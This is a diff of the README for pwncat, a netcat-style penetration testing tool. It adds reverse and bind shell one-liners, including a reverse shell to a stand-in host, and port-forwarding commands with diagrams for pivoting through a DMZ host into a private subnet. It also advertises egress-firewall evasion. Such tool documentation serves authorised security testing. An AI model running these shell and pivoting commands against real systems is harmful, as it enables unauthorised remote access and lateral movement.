@@ -55,7 +55,7 @@ pip install pwncat
 
 ## :coffee: TL;DR
 
-#### Copy to target
+### Copy to target
 ```bash
 # Copy base64 data to clipboard from where you have internet access
 curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
@@ -64,30 +64,52 @@ curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
 echo "<BASE64 STRING>" | base64 -d > pwncat
 chmod +x pwncat
 ```
-#### Summon shells
+### Summon shells
 ```bash
-# bind shell
+# Bind shell
 pwncat -l -e '/bin/bash' 8080
 ```
 ```bash
-# reverse shell
-pwncat -e '/bin/bash' example.com 4444
+# Reverse shell (Ctrl+c proof)
+pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
 ```
-#### Port forwarding
+```bash
+# Reverse UDP shell (Ctrl+c proof)
+pwncat -e '/bin/bash' example.com 4444 -u --udp-ping-intvl 10
+```
 
-See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/<br/>
-(Using the same examples to make it more clear)
+### Proxy traffic
 
-The only difference to SSH port-forwarding shown in the blog, is that in their case, the MySQL server is only available on localhost on the remote server.
+> See here for SSH port-forwarding:<br>
+> https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/
+
+<sup>The only difference to SSH port-forwarding shown in the blog, is that in their case, the MySQL server is only available on localhost on the remote server.
 SSH portfowarding is exactly for this case, as it SSH's into the machine and can reach their local port.
 In the example here, we cannot SSH into the server, so we can only forward/proxy something which is externally available.
-That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)
+That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)</sup>
+
+#### Local port forward `-L` (Proxy)
 ```bash
-# Local port forward (-L)
-# Make Remote MySQL server (remote port 3306) available on local machine on local port 5000
-# (listen locally on 127.0.0.1:5000 and proxy everything to everythingcli.org:3306)
-pwncat -L 127.0.0.1:5000 everythingcli.org 3306
+# Make remote MySQL server (remote port 3306) available on current machine
+# on every interface on port 5000
+pwncat -L 0.0.0.0:5000 everythingcli.org 3306
 ```
+```bash
+# Same, but convert traffic on your end to UDP
+pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
+```
+
+#### Remote port forward `-R` (Double client Proxy)
+```bash
+# Connect to Remote MySQL server (remote port 3306) and then connect to another
+# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic
+pwncat -R 10.0.0.1:4444 everythingcli.org 3306
+```
+```bash
+# Same, but convert traffic on your end to UDP
+pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
+```
+Have a look at a more detailed **[port forwarding example with scenarios](#port-forwarding)**.
 
 
 ## :star: Features
@@ -98,7 +120,7 @@ pwncat -L 127.0.0.1:5000 everythingcli.org 3306
 |----------------|-------------|
 | Bind shell     | Create bind shells |
 | Reverse shell  | Create reverse shells |
-| Port Forward   | Local port forward (Proxy server) |
+| Port Forward   | Local and remote port forward (Proxy server/client) |
 | <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
 | Detect Egress  | Scan and report open egress ports on the target |
 | Evade FW       | Evade egress firewalls by round-robin outgoing ports |
@@ -361,6 +383,89 @@ tail -fn50 comm.txt
 [DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
 ```
 
+### Port forwarding
+
+#### Local TCP port forwarding
+
+**Scenario**
+1. Alice can be reached from the Outside (TCP/UDP)
+2. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
+     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat 72.0.0.1 3306     |      pwncat \                 |
+                              |        -L 72.0.0.1:3306 \     |
+                              |         10.0.0.1 3306         |
+```
+
+#### Local UDP port forwarding
+
+**Scenario**
+1. Alice can be reached from the Outside (but only via UDP)
+2. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
+     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat -L       |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -u 72.0.0.1 3306  |      pwncat -u \              |
+                              |        -L 72.0.0.1:3306 \     |
+                              |        10.0.0.1 3306          |
+```
+
+#### Remote TCP port forward
+
+**Scenario**
+1. Alice cannot be reached from the Outside
+2. Alice is allowed to connect to the Outside (TCP/UDP)
+3. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
+     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -l 4444           |      pwncat --reconn \        |
+                              |        -R 56.0.0.1:4444 \     |
+                              |        10.0.0.1 3306          |
+```
+
+#### Remote UDP port forward
+
+**Scenario**
+1. Alice cannot be reached from the Outside
+2. Alice is allowed to connect to the Outside (UDP: DNS only)
+3. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
+     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -u -l 53          |      pwncat -u --reconn \     |
+                              |        -R 56.0.0.1:4444 \     |
+                              |        10.0.0.1 3306          |
+```
 
 ## :lock: [cytopia](https://github.com/cytopia) sec tools
 
